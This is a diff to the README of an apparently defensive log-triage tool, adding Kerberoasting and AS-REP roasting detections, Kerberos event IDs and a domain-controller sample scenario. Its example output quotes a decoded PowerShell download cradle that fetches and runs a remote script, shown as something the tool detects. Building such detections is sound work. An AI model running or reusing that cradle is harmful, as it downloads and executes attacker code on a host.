@@ -18,6 +18,8 @@ No dependencies beyond the Python 3.10+ standard library.
 | EXEC-002 | Office app spawning a shell or script host | T1204.002, T1566.001 |
 | NET-001 | Script host connecting to an external address | T1105, T1071.001 |
 | FILE-001 | Office or script host dropping an executable or script | T1105, T1204.002 |
+| KERB-001 | Kerberoasting: RC4 service tickets for several service accounts | T1558.003 |
+| KERB-002 | AS-REP roasting: TGTs issued without pre-authentication | T1558.004 |
 | EVADE-001 | Security event log cleared | T1685.005 |
 
 Logic, tuning, false positives and known gaps for each rule are in [docs/DETECTIONS.md](docs/DETECTIONS.md). The same detections are published as **Sigma rules** in [sigma/](sigma/README.md), validated with `sigma-cli` in CI and convertible to Splunk, Elastic, Sentinel and other SIEMs. ATT&CK IDs follow ATT&CK v20.1.
@@ -41,7 +43,7 @@ python -m soc_triage scan sample_logs/* --year 2026
     what : PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.
     decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
 ...
-Summary: 5 critical, 7 high, 8 medium
+Summary: 5 critical, 10 high, 8 medium
 ```
 
 See the full Markdown report it produces: [docs/example_report.md](docs/example_report.md).
@@ -56,7 +58,7 @@ python -m soc_triage scan /var/log/auth.log --output markdown --out-file report.
 python -m soc_triage scan events.jsonl --output json --fail-on high
 
 # Tune thresholds for a noisy environment
-python -m soc_triage scan auth.log --bf-count 20 --bf-window 10 --spray-users 8 --min-severity high
+python -m soc_triage scan auth.log --bf-count 20 --bf-window 10 --spray-users 8 --kerb-services 5 --min-severity high
 
 # Suppress auth alerts from trusted sources (vulnerability scanner, jump hosts)
 python -m soc_triage scan auth.log --allow-ip 10.10.5.0/24 --allow-file trusted_sources.txt
@@ -71,7 +73,7 @@ Or install it to get a `soc-triage` command: `pip install -e .[dev]`.
 - **Linux:** `auth.log` / `secure` with classic syslog (`Nov 10 02:13:04`, treated as UTC; set the year with `--year`) or ISO-8601 timestamps.
 - **Linux auditd:** `/var/log/audit/audit.log` records `USER_AUTH`, `USER_LOGIN`, `ADD_USER` and `USER_MGMT` (group changes), with the optional `node=` host prefix, hex-encoded account names and the enriched log format. A failed SSH login writes two records; it is counted once.
 - **Sysmon:** events 1 (process create), 3 (network connection) and 11 (file create) as JSON lines or a JSON array, with Sysmon's own field names (`Image`, `ParentImage`, `CommandLine`, `DestinationIp`, `TargetFilename`, `UtcTime`, ...). Recognised by `Channel` or by the presence of `Image`, so they can be mixed with Security events in one file.
-- **Windows:** Security events as JSON lines or a JSON array with fields such as `EventID`, `TimeCreated`, `Computer`, `TargetUserName`, `SubjectUserName`, `IpAddress`, `CommandLine`. Event IDs used: 1102, 4624, 4625, 4688, 4720, 4728, 4732, 4756. An export like this works:
+- **Windows:** Security events as JSON lines or a JSON array with fields such as `EventID`, `TimeCreated`, `Computer`, `TargetUserName`, `SubjectUserName`, `IpAddress`, `CommandLine`. Event IDs used: 1102, 4624, 4625, 4688, 4720, 4728, 4732, 4756, and from domain controllers 4768, 4769, 4771 (Kerberos). IPv4-mapped addresses (`::ffff:10.0.0.5`) and `user@REALM` names are normalised. An export like this works:
 
 ```powershell
 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4688,4720,4732,1102} |
@@ -89,7 +91,8 @@ Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4688,4720,4732,
 3. A Word document on a finance workstation launching a hidden, encoded PowerShell download cradle.
 4. An RDP brute force against a jump host, a new local admin, then the Security log cleared.
 5. A second server, `web02`, logging through auditd (`audit.log`): brute force that lands, then a `systemd-sync` account added to `wheel`.
-6. The same finance workstation seen through Sysmon (`sysmon.jsonl`): Word drops a `.vbs`, launches PowerShell, PowerShell calls out to the internet and writes `update.exe`.
+6. The domain controller's view (`dc01_security.jsonl`): from the compromised workstation the attacker sprays Kerberos passwords (4771 only, no 4625s), AS-REP roasts two accounts and Kerberoasts four service accounts. Legacy RC4 to computer accounts, krbtgt and a single service stays quiet.
+7. The same finance workstation seen through Sysmon (`sysmon.jsonl`): Word drops a `.vbs`, launches PowerShell, PowerShell calls out to the internet and writes `update.exe`.
 
 It also includes benign activity that must **not** alert: a user mistyping their password, `-ExecutionPolicy Bypass` scripts, and a non-privileged group change. All IPs come from the RFC 5737 documentation ranges.
 
@@ -122,8 +125,10 @@ docs/             rule documentation and example report
 
 Done in v0.2.0: allow-lists and IP scope (#1), Sysmon (#2), auditd (#3), Sigma rules (#4).
 
+Done in v0.3.0: Kerberoasting, AS-REP roasting and Kerberos password spraying (#9).
+
 Next:
-- Kerberos detections: Kerberoasting (4769 with RC4, T1558.003) and AS-REP roasting (4768, T1558.004)
+- Golden and silver ticket indicators (4769 without a matching 4768, unusual ticket lifetimes)
 - Offline GeoIP and ASN enrichment for external sources
 - Web server access logs (Apache/Nginx): scanning, path traversal and web shell patterns
 - Express AUTH-003 and ACCT-003 as Sigma temporal correlations once backends support chained correlations well
